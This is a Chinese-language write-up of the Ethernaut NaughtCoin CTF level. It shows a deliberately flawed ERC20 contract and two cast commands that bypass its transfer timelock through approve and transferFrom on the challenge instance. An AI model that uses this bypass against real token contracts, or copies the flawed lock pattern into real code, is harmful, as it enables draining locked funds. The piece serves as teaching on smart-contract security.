#   Level 15 NaughtCoin
實例地址：`0x78E761A7aE384e6072490796b7F5aadDBe02CBf7`

##  題目說明
NaughtCoin 是一種 ERC20 代幣，而且你已經持有這些代幣。問題是你只能在等待 10 年的鎖倉期之後才能轉移它們。你能不能嘗試將它們轉移到另一個地址，讓你可以自由地使用它們嗎？要完成這個關卡的話要讓你的帳戶餘額歸零。

  可能會有用的資訊

*   ERC20 標準
*   OpenZeppelin 程式庫
```solidity
NaughtCoin 是一種 ERC20 代幣，而且你已經持有這些代幣。問題是你只能在等待 10 年的鎖倉期之後才能轉移它們。你能不能嘗試將它們轉移到另一個地址，讓你可以自由地使用它們嗎？要完成這個關卡的話要讓你的帳戶餘額歸零。

  可能會有用的資訊

*   ERC20 標準
*   OpenZeppelin 程式庫
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

##  POC
這項合約繼承了 ERC20 協議，該合約更改了 `transfer` 導致我們無法使用 `transfer` 直接將代幣轉出，但是我可以透過該協議的 `approve` 和 `transferFrom` 繞過 `lockTokens`，將代幣轉出。


1. `approve` 給其他地址 
```bash
cast send --account=Panda 0x78E761A7aE384e6072490796b7F5aadDBe02CBf7 "approve(address,uint256)" 0x23091d5f37FBeAd4C5109A0cDb2A00989ADA0836 1000000000000000000000000
```

2. 透過其他地址轉出
```bash
cast send --account=TEST 0x78E761A7aE384e6072490796b7F5aadDBe02CBf7 "transferFrom(address,address,uint256)" 0xEBA2Ef27A1B85a4685953E82848e9d2E9ED5b0B6 0x23091d5f37FBeAd4C5109A0cDb2A00989ADA0836 1000000000000000000000000
```